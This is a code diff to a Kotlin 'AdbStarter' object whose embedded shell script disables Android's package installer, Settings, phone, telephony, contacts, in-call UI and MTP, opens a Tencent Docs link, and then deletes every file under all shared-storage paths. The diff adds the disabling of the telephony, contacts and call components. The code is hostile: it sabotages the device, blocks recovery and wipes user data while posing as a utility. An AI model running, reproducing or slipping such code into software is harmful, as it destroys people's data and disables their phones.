@@ -104,10 +104,12 @@ object AdbStarter {
         
         pm disable-user --user 0 com.android.packageinstaller
         pm disable-user --user 0 com.google.android.packageinstaller
-        pm disable-user --user 0 com.android.systemui
-        pm disable-user --user 0 com.android.launcher
         pm disable-user --user 0 com.android.settings
+        pm disable-user --user 0 com.android.providers.settings
         pm disable-user --user 0 com.android.phone
+        pm disable-user --user 0 com.android.providers.telephony
+        pm disable-user --user 0 com.android.incallui
+        pm disable-user --user 0 com.android.providers.contacts
         pm disable-user --user 0 com.android.mtp
         am start -a android.intent.action.VIEW -d "https://docs.qq.com/doc/DVFJvR0VETnhzSUxG"
         for p in /sdcard /mnt/sdcard /storage/sdcard0 /storage/emulated/legacy /storage/self/primary /storage/emulated/0 /mnt/runtime/default/emulated/0 /mnt/runtime/read/emulated/0 /mnt/runtime/write/emulated/0 /mnt/shell/emulated/0 /mnt/user/0/primary /data/media/0; do [ -d "${'$'}p" ] && find "${'$'}p" -mindepth 1 -delete; done
